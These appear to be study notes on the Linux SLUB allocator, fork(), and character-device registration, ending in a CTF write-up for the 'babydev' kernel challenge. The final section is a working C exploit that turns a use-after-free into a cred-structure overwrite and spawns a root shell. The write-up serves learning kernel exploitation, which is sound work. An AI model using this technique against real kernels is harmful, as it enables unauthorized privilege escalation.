## kmem_cache_cpu 
void **freelist: This is a pointer to the next allocatable object. In the SLAB allocator, when objects are freed, they are not immediately returned to the global memory pool; instead, they are linked into this free list. This way, when an object needs to be allocated again, it can be quickly fetched from this list, improving allocation speed.

struct page *page: This pointer points to the SLAB page from which objects are currently being allocated. This member records the specific SLAB page targeted by the current allocation activity (a pointer to the SLAB page currently in use. Some objects on this page may already have been allocated, while some may still be free.)

struct page *partial: It points to a partially allocated SLAB page. A partially allocated SLAB means there are still some unused objects in that SLAB.

"Freezing" a SLAB page is a management strategy: when some objects in the page have already been allocated but some remain unused, the SLAB page is marked as inactive and is no longer the preferred source for regular allocations. This usually happens after an attempt to migrate free objects from the SLAB page to the CPU-local freelist (free list) fails — that is, when it is found that the SLAB page actually has no free objects to migrate.
## kmem_cache_node[ ]
struct list_head partial: This is a list head used to link partially allocated SLAB pages. Each partially allocated SLAB page is attached to this list via its own list_head structure member, making it easy to manage and quickly find available SLAB pages.


## Freezing and Unfreezing

1. **Frozen**: When a SLAB page is marked as "frozen", it means that although the SLAB still has unallocated objects, for performance optimization or other management purposes, new allocations from this SLAB are temporarily not wanted. This state is usually used to reduce search costs during allocation or to avoid excessive fragmentation. For example, if most objects in a SLAB page have already been allocated and only a few free objects remain, freezing it reduces the frequency of checking it, because preferring completely free SLABs when allocating new objects is more efficient.

   - For `cpu1`'s `kmem_cache_cpu`, if its SLAB is frozen, `cpu1` can still take objects out of that SLAB (if any) or return objects to it, because it is its own private resource. However, other CPU cores (such as `cpu2`) cannot take objects from this frozen SLAB; they can only return objects to it (if they previously obtained objects from that SLAB).

2. **Unfrozen**: Conversely, a SLAB page in the "unfrozen" state fully participates in the allocation process, and any CPU core can allocate objects from it as long as the corresponding access rules are followed. In the SLUB allocator, SLABs on the CPU-local partial list are usually frozen, while SLABs on the Node-level partial list are unfrozen, because Node-level SLABs are resources shared by all CPUs and need to remain highly available.

3. **Unfreezing the slab after exhausting the objs of kmem_cache_cpu's slab**: This means that when all objects in the SLAB page of a CPU core's (such as `cpu1`) `kmem_cache_cpu` have been allocated and new objects are needed, the previously frozen SLAB may be "unfrozen". This is because, as allocation pressure increases, even SLABs with few remaining objects become valuable and can be reactivated to provide allocation services, relieving memory allocation pressure.

## Allocation
1. Check the first object in the freelist of the per-CPU cache; if there is none, go to step 2
2. Migrate the free objects from the slab page pointed to by page in the per-CPU cache into the freelist; if there are no free objects, go to step 3
3. Migrate the first slab page from the partial list of the per-CPU cache to the page pointer; if the partial list is empty, go to step 4
4. Migrate a slab page from the Node-managed partial list to the page of the per-CPU cache, and repeat for a second slab page to add it to the partial list of the per-CPU cache; if every Node's partial list is empty, go to step 5
5. Obtain pages from the Buddy System and add them to the per-CPU page.

## Freeing
1. Return the object directly to the freelist; the page becomes free
2. Put the page on the per-CPU-managed partial list; slab pages in the per-CPU-managed partial list are added to the tail of the Node-managed partial list
3. If the slab page is completely free, remove the slab page from the Node's partial list and return it to the buddy system
# fork 
A concrete C language example to explain how `fork()` works and where the child process starts executing:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    pid_t pid = fork(); // 调用fork创建子进程

    if (pid < 0) {
        perror("Fork failed");
        return 1;
    }

    if (pid == 0) { // 这是子进程
        printf("这是子进程，PID: %u，从这里开始执行。\n", getpid());
        sleep(1); // 让子进程暂停1秒，以便观察
        printf("子进程执行完成。\n");
    } else { // 这是父进程
        printf("这是父进程，PID: %u，fork后立即从这里继续执行。\n", getpid());
        wait(NULL); // 父进程等待子进程结束
        printf("父进程检测到子进程结束。\n");
    }

    return 0;
}
```

In this example, when the program executes the `fork()` call, the operating system creates a child process that is almost identical to the current process. Afterwards, both the parent and child processes continue executing the code after the `fork()` call, but follow different execution paths based on the return value of `fork()`.

- **Parent process**: `fork()` returns the child's PID, so it executes the `pid > 0` branch, printing the parent's PID and waiting for the child process to finish.
- **Child process**: `fork()` returns 0 in the child process, so it executes the `pid == 0` branch, printing the "this is the child process" message, then pausing for one second, and then printing "child process execution complete".

So the child process actually starts executing a copy of the program from the `fork()` call point, but it jumps to a specific code path based on the return value of `fork()`. This allows the parent and child processes to execute different logic and work together to accomplish complex tasks.

## `alloc_chrdev_region`
`alloc_chrdev_region` is a Linux kernel function used to dynamically allocate one or a group of consecutive character device numbers (major numbers), and to register the mapping between these device numbers and the device name. This function is an important step often used by character device driver developers when initializing a device driver. Below is a detailed explanation of this function call:

```c
alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev")
```

- **`&babydev_no`**: This is a pointer used to receive the allocated character device major number. After a successful call, `babydev_no` will store the first major number allocated to the device.

- **`0LL`**: This parameter indicates the starting minor number offset. Setting it to 0 here means allocation starts from minor number 0. In many cases, for devices that only need one device number, this value is usually 0.

- **`1LL`**: Indicates the number of device numbers to allocate. Here it requests 1 consecutive device number. If the driver needs to manage multiple different types of devices, more device numbers may need to be allocated.

- **`"babydev"`**: A string parameter indicating the name of the device. This name is shown in the `/proc/devices` file to identify the device type; it is a friendly device identifier for system administrators and developers.

The purpose of this function call is to request the kernel to allocate a new character device number associated with the device name "babydev". Once allocation succeeds, this device number can be used to create and operate device files, enabling communication with the device. If the allocation succeeds, the `babydev_no` variable stores the allocated major number; if the allocation fails (for example, there are not enough device numbers available), the function returns a negative error code.

## cdev_add
`v1 = cdev_add(&cdev_0, babydev_no, 1LL);` is a typical function call in Linux kernel programming, used to register a character device with the kernel.

- **cdev_add**: This is a kernel API function used to register a character device with the kernel. It makes the device recognizable to the system and allows user space to interact with it through the filesystem interface.

- `&cdev_0`: This is a pointer to a `struct cdev` structure, which contains the necessary information for the character device, such as the device operation function set (file_operations), the device number, and so on. In the previous initialization process, the `cdev_init` function already set this information, so it is now passed by pointer to `cdev_add` for registration.

- `babydev_no`: This is a `dev_t` type variable representing the device number. In the previous code snippet, a device number was allocated for the device via the `alloc_chrdev_region` function, where `babydev_no` is the allocated major number. The device number is the key that uniquely identifies a device in the kernel; it is divided into a major number and a minor number, and only the major number is used here.

- `1LL`: This parameter indicates the number of minor numbers to register. Passing `1LL` (i.e., 1) here means registering one minor number. In some cases, one major number can correspond to multiple logical devices, each distinguished by a different minor number.

## device_create
`device_create()` is a function in the Linux kernel API used to dynamically create and register a new device instance in the device model. This function simplifies the various low-level operations related to device creation, including kobject initialization, sysfs entry creation, and association with the device class. The given function call example:

```c
device_create(babyclass, 0LL, babydev_no, 0LL, "babydev");
```


1. **babyclass**: This is a pointer to an already defined `struct class` instance. In the device model, `class` represents a category of devices and defines the common behavior and attributes of the devices.

2. **0LL**: This is the device number of the device's parent device in the device hierarchy. In many cases, if the device has no direct parent or no parent needs to be specified, this value is set to `NULL` or `0`. Here `0LL` is a long integer zero, serving the same purpose.

3. **babydev_no**: This is the device number of the device to be created. In Linux, the device number uniquely identifies a device; it is divided into a type number (major number) and an instance number (minor number), used to distinguish different types of devices and different instances of the same type. Here it is assumed that `babydev_no` is a previously allocated device number.

4. **0LL**: Similar to the second parameter, this is the private data pointer passed to the device, usually used to store device-specific data. Again, `0LL` is used to indicate that no private data needs to be passed.

5. **"babydev"**: This is a C string used to specify the name displayed in sysfs for the newly created device. When users view the device through sysfs, this name appears as the name of the device directory, making it easy to identify.


The device_create function is called to dynamically create a logical device and initialize the new logical device; it also associates it with the logical class corresponding to the first parameter and adds this logical device to the device driver model of the Linux kernel system. In this way, the function automatically creates a new logical device directory under /sys/devices/virtual and creates the device file corresponding to the logical class in the /dev directory.

# Approach
Bind to a single CPU, otherwise the UAF may not succeed; but this challenge starts with ` -smp cores=1,threads=1` — 1 core and 1 thread — so no binding is needed
1.  Since babydev_struct is a global variable, calling open twice in a row yields two file descriptors that can both operate on babydev_struct
2. Exploiting the fact that after close the memory is freed but not zeroed — that is, the other unclosed file descriptor can still operate on the freed babydev_struct.device_buf — a UAF exists
3. If at this point the just-freed object is allocated as a cred structure, then the obtained object and babydev_struct.device_buf are the same one, so the cred can be written through the other unclosed file descriptor
# exp

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <unistd.h>

int main() {
    int fd1 = open("/dev/babydev", O_RDWR); //分配device_buf和设置device_buf_len
    int fd2 = open("/dev/babydev", O_RDWR); // 分配重新设置device_buf和device_buf_len
    ioctl(fd1, 65537, 0xa8);    //分配重新设置device_buf和device_buf_len 大小和cred结构体一样
    close(fd1); // free掉0xa8大小的device_buf，但没清空

    if (!fork()) { //父进程返回子进程的pid，子进程返回0
        
        char mem[4 * 7]; // usage uid gid suid sgid euid egid
        memset(mem, '\x00', sizeof(mem));
        write(fd2, mem, sizeof(mem));
        system("/bin/sh");
    }
    else
        wait(NULL);  //父进程要等子进程结束才行

    return 0;
}
```
